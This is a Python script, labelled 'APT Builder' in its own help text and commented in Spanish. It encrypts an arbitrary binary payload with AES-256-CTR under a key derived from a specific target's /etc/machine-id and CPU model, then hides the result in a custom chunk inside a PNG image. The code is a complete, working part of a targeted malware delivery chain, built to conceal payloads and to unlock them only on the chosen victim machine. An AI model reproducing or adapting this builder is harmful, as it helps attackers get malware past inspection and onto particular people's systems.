import sys
import os
import struct
import argparse
import zlib
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

# Configuración
CHUNK_NAME = b"loLO"
SALT = b"LO_IS_WATCHING"

def derive_key(machine_id, cpu_model):
    """Deriva la clave de cifrado basada en el entorno objetivo."""
    raw_data = machine_id.strip().encode() + cpu_model.strip().encode() + SALT
    hasher = SHA256.new(raw_data)
    return hasher.digest()

def create_png_chunk(type_bytes, data):
    """Crea un chunk PNG válido (Length + Type + Data + CRC)."""
    if len(type_bytes) != 4:
        raise ValueError("Type must be 4 bytes")

    length = struct.pack(">I", len(data))
    chunk_type = type_bytes
    chunk_data = data
    # CRC se calcula sobre Type + Data
    crc = zlib.crc32(chunk_type + chunk_data) & 0xffffffff
    crc_bytes = struct.pack(">I", crc)

    return length + chunk_type + chunk_data + crc_bytes

def inject_chunk(png_path, chunk_data, output_path):
    """Inyecta el chunk antes del IEND."""
    with open(png_path, "rb") as f:
        png_data = f.read()

    # Validar firma PNG
    if png_data[:8] != b'\x89PNG\r\n\x1a\n':
        raise ValueError("No es un archivo PNG válido")

    # Buscar IEND
    # Un chunk IEND válido siempre es: 00 00 00 00 49 45 4E 44 AE 42 60 82
    iend_marker = b'\x00\x00\x00\x00IEND\xaeB`\x82'

    # Buscar la posición del IEND. Puede haber datos basura después, así que buscamos desde el final
    # Pero lo más seguro es buscar el marcador de bloque IEND
    # O recorrer los chunks. Recorrer es más robusto.

    offset = 8
    while offset < len(png_data):
        length = struct.unpack(">I", png_data[offset:offset+4])[0]
        chunk_type = png_data[offset+4:offset+8]

        if chunk_type == b'IEND':
            # Inyectar aquí
            new_png = png_data[:offset] + chunk_data + png_data[offset:]
            with open(output_path, "wb") as out:
                out.write(new_png)
            print(f"[*] Chunk inyectado en offset {offset}")
            return

        offset += 12 + length # 4(len) + 4(type) + len(data) + 4(crc)

    raise ValueError("Chunk IEND no encontrado")

def encrypt_payload(payload_path, key):
    """Cifra el payload usando AES-256-CTR."""
    with open(payload_path, "rb") as f:
        data = f.read()

    # Usar un IV fijo o aleatorio?
    # Para CTR necesitamos IV (nonce). Lo pondremos al principio del blob.
    # El loader leerá los primeros 16 bytes como IV.

    # Mejor: Generar nonce de 8 bytes (64 bits) y dejar contador a 0.
    nonce = os.urandom(8)
    # IV (Counter Block) será Nonce + 0000000000000000
    # PyCryptodome usa nonce como prefijo.
    cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
    ciphertext = cipher.encrypt(data)

    # El IV completo que necesita el loader (que implementa CTR crudo)
    # Loader espera 16 bytes IV. En CTR, usualmente es Nonce(8) + Counter(8).
    # PyCryptodome por defecto usa un contador big endian de 64 bits empezando en 0.
    full_iv = nonce + b'\x00'*8

    return full_iv + ciphertext

def main():
    parser = argparse.ArgumentParser(description="The Architect - APT Builder")
    parser.add_argument("--machine-id", required=True, help="Target /etc/machine-id")
    parser.add_argument("--cpu-model", required=True, help="Target CPU Model String")
    parser.add_argument("--payload", required=True, help="Path to binary payload")
    parser.add_argument("--carrier", required=True, help="Path to input PNG")
    parser.add_argument("--output", default="image.png", help="Path to output PNG")

    args = parser.parse_args()

    print(f"[*] Target Machine ID: {args.machine_id}")
    print(f"[*] Target CPU: {args.cpu_model}")

    key = derive_key(args.machine_id, args.cpu_model)
    print(f"[*] Derived Key: {key.hex()[:8]}...")

    encrypted_blob = encrypt_payload(args.payload, key)
    print(f"[*] Payload encrypted ({len(encrypted_blob)} bytes)")

    chunk = create_png_chunk(CHUNK_NAME, encrypted_blob)
    inject_chunk(args.carrier, chunk, args.output)
    print(f"[*] Build complete: {args.output}")

if __name__ == "__main__":
    main()
